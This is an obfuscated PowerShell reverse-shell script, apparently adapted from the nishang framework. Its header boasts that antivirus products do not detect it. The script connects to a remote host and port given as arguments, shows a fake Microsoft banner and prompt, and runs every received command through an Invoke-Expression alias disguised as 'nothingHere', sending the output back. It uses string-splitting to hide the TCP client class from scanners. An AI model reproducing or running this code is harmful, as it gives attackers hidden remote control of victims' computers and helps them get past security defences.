#Twitter: @TihanyiNorbert (No AV detecetion 2022 June)
#Reverse shell based on the original nishang Framework written by @nikhil_mitt.
Set-Alias -Name K -Value Out-String
Set-Alias -Name nothingHere -Value iex
$BT = New-Object "S`y`stem.Net.Sockets.T`CPCl`ient"($args[0],$args[1]);
$replace = $BT.GetStream();
[byte[]]$B = 0..(32768*2-1)|%{0};
$B = ([text.encoding]::UTF8).GetBytes("(c) Microsoft Corporation. All rights reserved.`n`n")
$replace.Write($B,0,$B.Length)
$B = ([text.encoding]::ASCII).GetBytes((Get-Location).Path + '>')
$replace.Write($B,0,$B.Length)
[byte[]]$int = 0..(10000+55535)|%{0};
while(($i = $replace.Read($int, 0, $int.Length)) -ne 0){;
$ROM = [text.encoding]::ASCII.GetString($int,0, $i);
$I = (nothingHere $ROM 2>&1 | K );
$I2  = $I + (pwd).Path + '> ';
$U = [text.encoding]::ASCII.GetBytes($I2);
$replace.Write($U,0,$U.Length);
$replace.Flush()};
$BT.Close()
